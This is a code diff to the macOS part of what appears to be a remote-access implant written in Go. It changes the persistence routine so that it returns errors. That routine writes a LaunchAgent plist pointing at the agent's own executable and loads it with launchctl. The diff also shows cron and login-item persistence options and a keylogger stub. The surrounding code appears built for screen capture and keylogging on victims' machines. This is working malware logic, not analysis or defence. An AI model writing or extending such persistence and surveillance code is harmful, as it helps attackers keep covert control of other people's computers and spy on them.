@@ -61,17 +61,14 @@ func captureScreenRGBA() (*image.RGBA, error) {
 
 func applyHideWindow(cmd *exec.Cmd) {}
 
-func addPersistenceWindows() {}
-func addPersistenceLinux()   {}
+func addPersistenceWindows()     {}
+func addPersistenceLinux() error { return nil }
 
 // addPersistenceDarwin installs a LaunchAgent plist in ~/Library/LaunchAgents.
-func addPersistenceDarwin() {
+func addPersistenceDarwin() error {
 	exe, err := os.Executable()
 	if err != nil {
-		if Debug {
-			fmt.Printf("[!] persistence: cannot resolve executable: %v\n", err)
-		}
-		return
+		return fmt.Errorf("cannot resolve executable: %v", err)
 	}
 	absExe, err := filepath.Abs(exe)
 	if err != nil {
@@ -80,18 +77,12 @@ func addPersistenceDarwin() {
 
 	home := os.Getenv("HOME")
 	if home == "" {
-		if Debug {
-			fmt.Println("[!] persistence: HOME not set")
-		}
-		return
+		return fmt.Errorf("HOME not set")
 	}
 
 	launchAgentsDir := filepath.Join(home, "Library", "LaunchAgents")
 	if err := os.MkdirAll(launchAgentsDir, 0755); err != nil {
-		if Debug {
-			fmt.Printf("[!] persistence: mkdir LaunchAgents failed: %v\n", err)
-		}
-		return
+		return fmt.Errorf("mkdir LaunchAgents failed: %v", err)
 	}
 
 	label := "com." + sanitizeLabel(persistencePrefix) + ".agent"
@@ -114,21 +105,15 @@ func addPersistenceDarwin() {
 	</plist>`, label, absExe)
 
 	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
-		if Debug {
-			fmt.Printf("[!] persistence: write plist failed: %v\n", err)
-		}
-		return
+		return fmt.Errorf("write plist failed: %v", err)
 	}
 
 	guiDomain := fmt.Sprintf("gui/%d", os.Getuid())
 	_ = exec.Command("launchctl", "bootout", guiDomain, plistPath).Run()
 	if out, err := exec.Command("launchctl", "bootstrap", guiDomain, plistPath).CombinedOutput(); err != nil {
-		if Debug {
-			fmt.Printf("[!] persistence: launchctl bootstrap: %v %s\n", err, string(out))
-		}
-	} else if Debug {
-		fmt.Printf("[*] persistence: LaunchAgent installed at %s\n", plistPath)
+		return fmt.Errorf("launchctl bootstrap failed: %v: %s", err, strings.TrimSpace(string(out)))
 	}
+	return nil
 }
 
 // removePersistenceDarwin removes the LaunchAgent plist installed by addPersistenceDarwin().
@@ -168,9 +153,13 @@ func getPlatformSecurityInfo() (string, bool, string) {
 	return integrity, elevated, domain
 }
 
+func keyloggerAvailable() error {
+	return fmt.Errorf("keylogging requires Windows (GetAsyncKeyState); not supported on macOS agents")
+}
+
 func keyloggerLoop() {
 	if Debug {
-		fmt.Println("[*] Keylogger not supported on macOS agent yet")
+		fmt.Println("[*] Keylogger not supported on macOS agent")
 	}
 	atomic.StoreInt32(&keylogActive, 0)
 }
@@ -998,7 +987,9 @@ func applyPersistence(method string, args string) string {
 	method = strings.ToLower(strings.TrimSpace(method))
 	switch method {
 	case "launchagent", "launchd", "plist":
-		addPersistenceDarwin()
+		if err := addPersistenceDarwin(); err != nil {
+			return "persistence: " + err.Error()
+		}
 		return "persistence: LaunchAgent plist installed"
 	case "cron", "crontab":
 		exe, _ := os.Executable()
@@ -1049,7 +1040,9 @@ func applyPersistence(method string, args string) string {
 		}
 		return "persistence: login item added"
 	default:
-		addPersistenceDarwin()
+		if err := addPersistenceDarwin(); err != nil {
+			return fmt.Sprintf("persistence: unknown method '%s': %s", method, err.Error())
+		}
 		return fmt.Sprintf("persistence: unknown method '%s', installed LaunchAgent", method)
 	}
 }
